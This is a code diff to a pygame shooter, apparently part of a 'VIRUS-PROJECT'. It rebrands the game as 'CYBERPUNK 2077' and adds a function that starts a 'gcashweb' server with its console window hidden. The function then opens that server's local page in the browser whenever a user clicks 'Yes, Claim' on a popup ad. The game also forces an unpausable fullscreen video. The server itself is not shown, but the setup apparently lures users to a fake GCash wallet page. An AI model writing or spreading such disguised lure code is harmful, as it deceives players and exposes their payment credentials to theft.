@@ -30,7 +30,7 @@ GRAY = (128, 128, 128)
 
 # Create the game window
 screen = pygame.display.set_mode((WIDTH, HEIGHT))
-pygame.display.set_caption("Top Down Shooter")
+pygame.display.set_caption("CYBERPUNK 2077")
 
 # Load sounds
 def load_sound(filename):
@@ -110,7 +110,7 @@ class Player(pygame.sprite.Sprite):
         # Power-up attributes
         self.active_powerup = None
         self.powerup_timer = 0
-        self.powerup_duration = 600  # 10 seconds at 60 FPS
+        self.powerup_duration = 1200  # 20 seconds at 60 FPS
 
     def update(self):
         keys = pygame.key.get_pressed()
@@ -773,6 +773,60 @@ class Background:
 root = tk.Tk()
 root.withdraw()
 
+# Function to start GCash server and open website
+def start_gcash_server():
+    import subprocess
+    import threading
+    import webbrowser
+    import time
+    import sys
+    
+    # Get the base path - works for both script and executable
+    if getattr(sys, 'frozen', False):
+        # If the application is run as a bundle (executable)
+        base_path = os.path.dirname(sys.executable)
+    else:
+        # If the application is run as a script
+        base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    
+    # Path to the server.py file
+    server_path = os.path.join(base_path, 'gcashweb', 'server.py')
+    
+    def run_server():
+        # Create startupinfo object to hide the console window
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = subprocess.SW_HIDE
+        
+        # Get the Python executable path
+        if getattr(sys, 'frozen', False):
+            # If running as executable, use the bundled Python
+            python_exe = sys.executable
+            # Start the process with hidden window - directly run the server module
+            subprocess.Popen([python_exe, '-c', 
+                             f"import sys; sys.path.append('{base_path}'); "
+                             f"import os; os.chdir('{os.path.join(base_path, 'gcashweb')}'); "
+                             f"from gcashweb.server import run_server; run_server()"], 
+                            startupinfo=startupinfo)
+        else:
+            # If running as script, use the system Python
+            subprocess.Popen(['python', server_path], 
+                            startupinfo=startupinfo)
+    
+    # Start the server in a separate thread
+    server_thread = threading.Thread(target=run_server)
+    server_thread.daemon = True  # Thread will exit when main program exits
+    server_thread.start()
+    
+    # Wait a moment for the server to start
+    time.sleep(1)
+    
+    # Open the website in the default browser
+    webbrowser.open('http://localhost:8000')
+    
+    print("GCash server started and website opened.")
+    return
+
 # Function to show popup ads
 def show_popup():
     popup = Toplevel()
@@ -798,7 +852,7 @@ def show_popup():
     entry.pack(pady=5)
 
     claim_button = Button(popup, text="Yes, Claim", state="disabled", 
-                         command=lambda: [popup.destroy(), setattr(player, 'popup_shown', True)])
+                         command=lambda: [popup.destroy(), setattr(player, 'popup_shown', True), start_gcash_server()])
     claim_button.pack(pady=10)
 
     def check_input(event):
@@ -841,16 +895,19 @@ def play_video():
     # Minimize Pygame window to avoid overlap
     pygame.display.iconify()
     
-    # VLC setup with reset plugins cache and fullscreen
+    # VLC setup with fullscreen flags
     instance = vlc.Instance('--reset-plugins-cache', '--fullscreen', '--no-video-title-show')
     player = instance.media_player_new()
     media = instance.media_new(r"C:\Users\DESKTOP\Desktop\VIRUS-PROJECT\script\assets\vid\win7.mp4")  # Your video path
     player.set_media(media)
+    
+    # Set fullscreen mode before playing
+    player.set_fullscreen(True)
+    
+    # Play the video
     player.play()
     
-    # Ensure fullscreen and disable pausing
-    time.sleep(0.5)  # Small delay to let VLC initialize
-    player.set_fullscreen(True)
+    # Ensure video can't be paused
     player.set_pause(0)
     
     video_running = True
@@ -929,7 +986,7 @@ while running:
         background.draw(screen)
         
         # Title
-        title_text = font_large.render("TOP DOWN SHOOTER", True, WHITE)
+        title_text = font_large.render("CYBERPUNK 2077", True, WHITE)
         title_rect = title_text.get_rect(center=(WIDTH//2, HEIGHT//3))
         screen.blit(title_text, title_rect)
         
@@ -1132,7 +1189,7 @@ while running:
         fill_width = bar_width * health_ratio
         outline_rect = pygame.Rect(10, 10, bar_width, bar_height)
         fill_rect = pygame.Rect(10, 10, fill_width, bar_height)
-        pygame.draw.rect(screen, RED, fill_rect)
+        pygame.draw.rect(screen, GREEN, fill_rect)
         pygame.draw.rect(screen, WHITE, outline_rect, 2)
 
         # Draw score
